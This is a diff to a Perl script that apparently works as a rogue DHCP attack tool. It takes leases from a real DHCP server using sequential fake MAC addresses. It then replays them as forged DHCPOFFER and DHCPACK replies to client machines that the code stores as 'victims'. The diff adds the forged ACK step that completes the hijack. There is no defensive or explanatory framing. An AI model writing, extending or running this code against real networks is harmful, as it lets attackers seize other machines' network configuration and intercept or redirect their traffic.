@@ -30,6 +30,8 @@ my $client = IO::Socket::INET->new(
 my $BRDCAST_TO_SERVER = sockaddr_in(67, INADDR_BROADCAST);
 my $BRDCAST_TO_CLIENT = sockaddr_in(68, INADDR_BROADCAST);
 
+my $towel_start_mac = 0xDEADBEEF0000;
+
 my $select = new IO::Select($client, $server) or die "IO::Select: $!";
 
 sub changeTowelState {
@@ -45,8 +47,8 @@ sub sendDiscover {
 	my ($xid, $hw) = @_;
 	# create DHCP Packet
 	$xid = $xid // int(rand(0xFFFFFFFF));
-	$hw = $hw // ($towel{$xid}{packet} && $towel{$xid}{packet}->chaddr) // int(rand(0xFFFFFFFF));
-	#print "-> DHCPDISCOVER $xid\n";
+	$hw = $hw // ($towel{$xid}{packet} && $towel{$xid}{packet}->chaddr) // sprintf("%X", $towel_start_mac++);
+	#print "-> DHCPDISCOVER $xid for $hw\n";
 	my $discover = Net::DHCP::Packet->new(
 		Xid => $xid, # random xid
 		Flags => 0x8000,              # ask for broadcast answer
@@ -92,20 +94,32 @@ sub offerTowel {
 		print "Unable to find a suitable towel\n";
 		return;
 	}
-	my $offer = new Net::DHCP::Packet(
-		Op => BOOTREPLY(),
-		Xid => $packet->xid(),
-		Flags => $packet->flags(),
-		Ciaddr => $packet->ciaddr(),
-		Yiaddr => $towel{$towel_id}{packet}->yiaddr(),
-		Siaddr => $packet->siaddr(),
-		Giaddr => $packet->giaddr(),
-		Chaddr => $packet->chaddr(),
-		DHO_DHCP_MESSAGE_TYPE() => DHCPOFFER(),
-	);
+	my $offer = new Net::DHCP::Packet($towel{$towel_id}{packet}->serialize());
+	$offer->xid($packet->xid);
+	$offer->chaddr($packet->chaddr);
+	$offer->removeOption(DHO_DHCP_MESSAGE_TYPE());
+	$offer->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), DHCPOFFER());
+
 	$server->send($offer->serialize(), undef, $BRDCAST_TO_CLIENT);
 	$victim{$packet->xid()} = $towel_id;
-	print "-> DHCPOFFER", $packet->xid, "(towel", $towel_id, ")\n";
+	print "-> DHCPOFFER ", $packet->xid, " (towel ", $towel_id, ")\n";
+}
+
+sub ackRequest {
+	my ($packet) = @_;
+	my $towel_id = $victim{$packet->xid};
+	unless ($towel_id) {
+		print "No registered towel\n";
+		return;
+	}
+	my $ack = new Net::DHCP::Packet($towel{$towel_id}{packet}->serialize());
+	$ack->xid($packet->xid);
+	$ack->chaddr($packet->chaddr);
+	$ack->removeOption(DHO_DHCP_MESSAGE_TYPE());
+	$ack->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), DHCPACK());
+
+	$server->send($ack->serialize(), undef, $BRDCAST_TO_CLIENT);
+	print "-> DHCPACK ", $packet->xid, " (towel ", $towel_id, ")\n";
 }
 
 sub readResponse {
@@ -141,6 +155,7 @@ sub readResponse {
 		} elsif ($packet->op == BOOTREQUEST() && $packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == DHCPREQUEST()) {
 			my $hostname = $packet->getOptionValue(DHO_HOST_NAME());
 			print "<- DHCPREQUEST $xid [$hostname]\n";
+			ackRequest($packet);
 		} else {
 			print $packet->toString();
 		}
